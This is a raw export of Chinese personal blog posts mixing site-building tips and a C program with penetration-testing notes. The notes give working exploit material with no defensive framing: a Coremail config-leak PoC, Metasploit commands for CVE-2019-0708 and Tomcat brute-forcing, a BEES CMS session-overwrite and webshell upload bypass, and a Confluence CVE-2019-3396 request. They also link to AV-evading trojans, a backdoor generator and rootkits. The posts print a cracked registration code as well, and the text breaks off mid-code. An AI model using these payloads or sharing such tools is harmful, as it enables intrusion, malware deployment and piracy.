class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地环境正常显示，不过推到github后就成下图所示了</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/404bug.PNG" alt=""></p><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>在知乎上看到有人说出现该问题的原因是github个人页强制使用https协议，而上面给的代码是http的，因此无法加载样式表。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>使用购买的域名指向自己的github个人主页，增加CNAME文件，然后调用公益404页面不会出现混合内容那个问题。（还是需要开启https协议！！！！！）</p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>使用以下代码达到相同的效果 ps:返回主页,后面链接改成自己的即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-cn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">homePageName</span>=<span class="string">"返回主页"</span> <span class="attr">homePageUrl</span>=<span class="string">"https://7iny.jxustctf.top"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://galaxyhao.github.io/2017/10/21/hexo%E8%85%BE%E8%AE%AF%E5%85%AC%E7%9B%8A404%E7%9A%84%E8%AE%BE%E7%BD%AE%E9%97%AE%E9%A2%98/" rel="external nofollow" target="_blank">参考文章</a></p><h3 id="更换背景"><a href="#更换背景" class="headerlink" title="更换背景"></a>更换背景</h3><p>我们直接在 NEXT 预留的自定义样式文件 “themes/next/source/css/_custom/custom.styl” 中添加自己的样式即可</p><p>为了让背景图平铺窗口我把scheme值改成了<code>Muse</code></p><p>菜单栏透明度设置后搜索功能不能正常使用，我注释掉了那部分代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  background: url(https://raw.githubusercontent.com/N407PengYuYan/img/master/img/index.png);</span><br><span class="line">  background-size: cover;</span><br><span class="line">  background-repeat: no-repeat;</span><br><span class="line">  background-attachment: fixed;</span><br><span class="line">  background-position: 50% 50%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改主体透明度</span><br><span class="line">.main-inner &#123;</span><br><span class="line">  background: #fff;</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 修改菜单栏透明度</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  opacity: 0.9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.diqigan.cn/posts/add-background-picture-for-next.html" rel="external nofollow" target="_blank">参考文章</a></p><h2 id="实用方法"><a href="#实用方法" class="headerlink" title="实用方法"></a>实用方法</h2><h3 id="win10添加网络打印机"><a href="#win10添加网络打印机" class="headerlink" title="win10添加网络打印机"></a>win10添加网络打印机</h3><p>控制面板-&gt;查看方式按小图标-&gt;凭据管理器-&gt;添加Windows凭据-&gt;输入网络打印机的IP地址,用户密码-&gt;命令行输入目标IP地址<code>\\xxx.xxx.xx.xxx</code></p><p><a href="https://jingyan.baidu.com/article/f71d60377572791ab741d14e.html" rel="external nofollow" target="_blank">参考文章</a></p><h3 id="校园宽带PPPOE拨号"><a href="#校园宽带PPPOE拨号" class="headerlink" title="校园宽带PPPOE拨号"></a>校园宽带PPPOE拨号</h3><p>路由器登陆选择宽带拨号<br>电信宽带：学号@telecom+密码（默认密码：身份证号后六位）<br>移动宽带：学号@cmcc+密码（默认密码：身份证号后六位）<br>联通宽带：学号@unicom+密码（默认密码：身份证号后六位）</p><p><a href="https://jingyan.baidu.com/article/0320e2c11807df1b86507b6e.html" rel="external nofollow" target="_blank">参考文章</a></p><h3 id="免费接码平台"><a href="#免费接码平台" class="headerlink" title="免费接码平台"></a>免费接码平台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">国内免费接码平台</span><br><span class="line"></span><br><span class="line">    https://sms.cm</span><br><span class="line">    https://www.pdflibr.com</span><br><span class="line">    https://www.becmd.com</span><br><span class="line">    http://www.smszk.com</span><br><span class="line"></span><br><span class="line">国外免费接码平台</span><br><span class="line"></span><br><span class="line">    https://zh.mytrashmobile.com（中文）</span><br><span class="line">    https://ch.freephonenum.com（中文）</span><br><span class="line">    SMSReceiveFree：https://smsreceivefree.com</span><br><span class="line">    Receive SMS Online for FREE：https://www.receive-sms-online.info</span><br><span class="line">    Receive a SMS Online：https://receive-a-sms.com</span><br><span class="line">    Free SMS Numbers Online：https://smsnumbersonline.com</span><br><span class="line">    Receive SMS online for Free：https://sms-online.co/receive-free-sms</span><br><span class="line">    Receive-SMS：https://receive-sms.com</span><br><span class="line">    Receive FREE SMS online：http://receivefreesms.com</span><br><span class="line">    RECEIVE SMS ONLINE：https://www.receivesmsonline.net</span><br><span class="line">    Free Online Phone：https://www.freeonlinephone.org</span><br><span class="line">    Receive SMS Online：http://receive-sms-online.com</span><br><span class="line">    TextNow：https://www.textnow.com</span><br><span class="line">    Textfree：https://www.pinger.com/text-free/</span><br><span class="line">    SELLAITE：http://sms.sellaite.com/</span><br><span class="line">    Twilio：https://www.twilio.com/</span><br><span class="line">    https://receive-sms.com/</span><br><span class="line">    http://receive-sms-online.com/</span><br><span class="line">    http://sms.sellaite.com/</span><br><span class="line">    http://hs3x.com/</span><br><span class="line">    http://receivefreesms.net</span><br><span class="line">    http://receivesmsonline.in</span><br><span class="line">    http://www.receive-sms-now.com</span><br><span class="line">    https://sms-receive.net</span><br><span class="line">    https://www.receivesms.net</span><br><span class="line">    http://www.freesmsverifications.com</span><br><span class="line">    http://receiveonlinesms.biz</span><br><span class="line">    http://receivesmsverification.com</span><br><span class="line">    https://www.receivesms.co</span><br><span class="line">    http://receiveonlinesms.com</span><br></pre></td></tr></table></figure><p><a href="https://liyuans.com/2019/01/freesms.html" rel="external nofollow" target="_blank">参考文章</a></p><h2 id="借助插件科学上网"><a href="#借助插件科学上网" class="headerlink" title="借助插件科学上网"></a>借助插件科学上网</h2><p>有时候代理会被大面积封锁，可是我们又需要进行学习，那么我们可以用第三方插件来满足我们的搜索需求</p><p><code>Ghelper</code>源码安装chrome插件</p><blockquote><p>1.打开你的Chrome浏览器的 更多工具&gt;扩展程序页面.<br>或者直接在网址输入: chrome://extensions/<br>2.这个页面点击 “添加已解压的扩展程序”<br>3.选择本次下载包里的 ghelper_source 目录<br>4.确认后就行了.</p></blockquote><p><a href="http://googlehelper.net/" rel="external nofollow" target="_blank">官网下载地址</a></p><h2 id="木马下载"><a href="#木马下载" class="headerlink" title="木马下载"></a>木马下载</h2><p><a href="http://www.mumaasp.com/category/%E5%85%8D%E6%9D%80asp%E6%9C%A8%E9%A9%AC" rel="external nofollow" target="_blank">asp木马</a></p><h2 id="Coremail-0day-敏感文件泄露漏洞"><a href="#Coremail-0day-敏感文件泄露漏洞" class="headerlink" title="Coremail 0day 敏感文件泄露漏洞"></a>Coremail 0day 敏感文件泄露漏洞</h2><p> <strong>POC:</strong> </p><blockquote><p>/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/</p></blockquote><p><strong>通过域名或者IP等地址+POC即可获取目标邮件服务器配置文件，配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。</strong></p><p><a href="https://www.7ooc.cn/web/15.html" rel="external nofollow" target="_blank">参考文章</a></p><p>2.apiws</p><blockquote><p><a href="http://host/apiws/services/" rel="external nofollow" target="_blank">http://host/apiws/services/</a></p></blockquote><blockquote><p><a href="http://host/apiws/services/API?wsdl" rel="external nofollow" target="_blank">http://host/apiws/services/API?wsdl</a></p></blockquote><p><a href="https://blog.csdn.net/qq_41770175/article/details/91971177" rel="external nofollow" target="_blank">参考文章</a></p><p><a href="https://www.cnvd.org.cn/webinfo/show/5075" rel="external nofollow" target="_blank">cnvd通告</a></p><h2 id="漏洞CVE-2019-0708"><a href="#漏洞CVE-2019-0708" class="headerlink" title="漏洞CVE-2019-0708"></a><strong>漏洞CVE-2019-0708</strong></h2><p>影响：该漏洞影响范围较广，windows2003、windows2008、windows2008 R2、windows xp * 系统都会遭到攻击，该服务器漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击的 。CVE-2019-0708漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。</p><p>kali依次执行验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</span><br><span class="line">set RHOSTS x.x.x.x</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="BEES企业网站管理系统漏洞"><a href="#BEES企业网站管理系统漏洞" class="headerlink" title="BEES企业网站管理系统漏洞"></a>BEES企业网站管理系统漏洞</h2><p>1.漏洞地址<a href="http://host/mx_form/mx_form.php?id=2" rel="external nofollow" target="_blank">http://host/mx_form/mx_form.php?id=2</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用火狐里面的firebug插件用post参数，覆盖session值，之后便可直接登录后台：_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=100000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>2.执行之后访问<a href="http://host/admin/admin.php" rel="external nofollow" target="_blank">http://host/admin/admin.php</a><br>3.点击内容管理—&gt;上传照片管理—&gt;修改<br>4.上传图片马，用burpsuite拦截将jpg改为php，即可绕过上传限制</p><h2 id="CVE-2019-3396"><a href="#CVE-2019-3396" class="headerlink" title="CVE-2019-3396"></a>CVE-2019-3396</h2><p>漏洞描述中指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。</p><p>漏洞分析参看<a href="https://paper.seebug.org/884/" rel="external nofollow" target="_blank">文章</a></p><p>Burp Suit复现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Referer:http://x.x.x.x/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>更多功能</p><p><a href="https://github.com/jas502n/CVE-2019-3396/" rel="external nofollow" target="_blank">参考1</a></p><p><a href="https://mp.weixin.qq.com/s/SycP0RCzMLazansAsp-D5Q" rel="external nofollow" target="_blank">获取shell</a></p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Github渗透工具资源整合"><a href="#Github渗透工具资源整合" class="headerlink" title="Github渗透工具资源整合"></a>Github渗透工具资源整合</h2><p> 超级弱口令多线程检查审计工具SNETCracker<br>可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。<a href="https://github.com/shack2/SNETCracker/releases" rel="external nofollow" target="_blank">下载地址</a></p><p>Github关键字监测、告警、发现<a href="https://github.com/deepdivesec/GitMAD" rel="external nofollow" target="_blank">下载地址</a></p><p>AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。<a href="https://github.com/Ch0pin/AVIator" rel="external nofollow" target="_blank">下载地址</a></p><p>Vxscan：一款用于渗透测试的多功能扫描工具<a href="https://github.com/al0ne/Vxscan" rel="external nofollow" target="_blank">下载地址</a></p><p>thinkphp v5.x 远程代码执行漏洞-POC集合<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" rel="external nofollow" target="_blank">下载地址</a></p><h2 id="实战中常用工具汇总"><a href="#实战中常用工具汇总" class="headerlink" title="实战中常用工具汇总"></a>实战中常用工具汇总</h2><p>1.进程隐藏工具<br><a href="https://github.com/gianlucaborello/libprocesshider" rel="external nofollow" target="_blank">libprocesshider</a><br><a href="https://github.com/f0rb1dd3n/Reptile" rel="external nofollow" target="_blank">Reptile</a><br>2.流量代理工具proxy<br><a href="https://github.com/vzex/dog-tunnel" rel="external nofollow" target="_blank">dog-tunnel</a><br>3.Linux辅助提权工具LinEnum.sh<br><a href="https://github.com/rebootuser/LinEnum" rel="external nofollow" target="_blank">LinEnum</a><br>4.脏牛提权工具c0w64<br><a href="https://github.com/Brucetg/DirtyCow-EXP" rel="external nofollow" target="_blank">c0w64</a><br>5.内网流量代理工具agent.exe<br><a href="https://github.com/cnlh/nps" rel="external nofollow" target="_blank">nps</a> </p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一九年五月总结</title>
      <link href="/944ec910.html"/>
      <url>/944ec910.html</url>
      
        <content type="html"><![CDATA[<hr><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/1905.jpg" alt=""></p><a id="more"></a><h2 id="学习博客"><a href="#学习博客" class="headerlink" title="学习博客"></a>学习博客</h2><p>1.漏洞挖掘大佬<code>blackwolf</code>的<a href="https://blackwolfsec.cc/" rel="external nofollow" target="_blank">博客</a></p><p>2.mntn0x的<a href="https://mntn0x.github.io/" rel="external nofollow" target="_blank">博客</a></p><h2 id="Tomcat密码爆破"><a href="#Tomcat密码爆破" class="headerlink" title="Tomcat密码爆破"></a>Tomcat密码爆破</h2><p>使用<strong>Metasploit</strong>实现Tomcat密码爆破</p><p>1.启动</p><blockquote><p>msfconsole</p></blockquote><p>2.搜索模块</p><blockquote><p>search tomcat </p></blockquote><p>3.调用模块</p><blockquote><p>use auxiliary/scanner/http/tomcat_mgr_login</p></blockquote><p>4.配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">配置RHOST,RHOST是目标主机IP</span><br><span class="line">&gt; set RHOST X.X.X.X</span><br><span class="line">配置RPORT,RPORT是目标主机端口</span><br><span class="line">&gt; set RPORT XXXX</span><br><span class="line"></span><br><span class="line">更改字典：可以通过设定PASS_FILE和USER_FILE配置项的路径进行更改（通常情况默认就行了）</span><br></pre></td></tr></table></figure><p>5.运行</p><blockquote><p>run</p></blockquote><p>参考文章</p><p>1.<a href="https://blog.csdn.net/itest_2016/article/details/76520723?utm_source=blogxgwz0" rel="external nofollow" target="_blank">Tomcat密码爆破小记</a></p><h2 id="next主题倒腾"><a href="#next主题倒腾" class="headerlink" title="next主题倒腾"></a>next主题倒腾</h2><p>官方文档:<a href="http://theme-next.iissnan.com/" rel="external nofollow" target="_blank">点击进入</a></p><p>报错解决：</p><blockquote><p>ENOENT: no such file or directory, open ‘D:\ myBlog\ themes\ next\ layout\ scripts\ schemes. swig’</p></blockquote><p>原因是配置文件 <code>_config.yml</code>有问题，我这是友情链接<code>：</code>后没空格的原因</p><p><a href="https://liaocy.net/2018/20180621-yamlvalidator/" rel="external nofollow" target="_blank">参考文章</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="图片在线设计"><a href="#图片在线设计" class="headerlink" title="图片在线设计"></a>图片在线设计</h3><p>感谢专业大神<code>orangice</code>的指导</p><p>在线图片设计fotor:<a href="https://www.fotor.com/cn/" rel="external nofollow" target="_blank">地址</a></p><h3 id="visual-studio-2012-安装"><a href="#visual-studio-2012-安装" class="headerlink" title="visual studio 2012 安装"></a>visual studio 2012 安装</h3><p>推荐一个高速下载还提供密钥的站点：<a href="https://www.nocang.com/visual-studio-ultimate-2012/" rel="external nofollow" target="_blank">点击进入</a></p><h3 id="C-Free-5下载"><a href="#C-Free-5下载" class="headerlink" title="C-Free 5下载"></a>C-Free 5下载</h3><p>下载网址：<a href="http://www.programarts.com/cfree_ch/" rel="external nofollow" target="_blank">点击进入</a></p><h4 id="注册码"><a href="#注册码" class="headerlink" title="注册码:"></a>注册码:</h4><p>用户名：<code>tianfang</code><br>邮箱：<a href="mailto:`quart@163.com" rel="external nofollow" target="_blank">`quart@163.com</a><code>注册码：</code>2NnUqd3shO2agta0xNjcusfK1LXO`</p><p><a href="https://zhidao.baidu.com/question/348880357.html" rel="external nofollow" target="_blank">参考文章</a></p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>C-Free 5安装好后记得改文件夹名把中间的空格去掉，否则会报以下错误</p><blockquote><p>[Error] g++.exe: 5\mingw\lib\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\mingw32\lib\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\bin\: No such file or directory</p><p>[Error] g++.exe: 5\mingw\mingw32\bin\: No such file or directory</p></blockquote><p><a href="https://blog.csdn.net/qq_34781336/article/details/79260427" rel="external nofollow" target="_blank">参考文章</a></p><h2 id="C程序"><a href="#C程序" class="headerlink" title="C程序"></a>C程序</h2><h3 id="线性表综合题"><a href="#线性表综合题" class="headerlink" title="线性表综合题"></a>线性表综合题</h3><blockquote><p>1.按照输入的顺序建立顺序表<br>2.对顺序表进行排序（直接插入、冒泡、选择、快速、合并)<br>3.按照由大到小的顺序建立一个单链表<br>4.链表逆置<br>5.将顺序表和链表合并成一个有序表。<br>6.结果输出</p></blockquote><p><a href="https://www.write-bug.com/article/1630.html" rel="external nofollow" target="_blank">解题思路和函数调用图参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/*链表节点*/</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">100</span>];    <span class="comment">/*线性表用数组存储*/</span></span><br><span class="line"><span class="keyword">int</span> count;    <span class="comment">/*顺序表计数器*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createList</span> <span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*建立顺序表*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顺序表长度："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顺序表第%d节点数据:"</span>,i);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printList</span><span class="params">(<span class="keyword">int</span> arr[])</span> </span>&#123;    <span class="comment">/*打印顺序表*/</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;   <span class="comment">/*打印排序结果*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 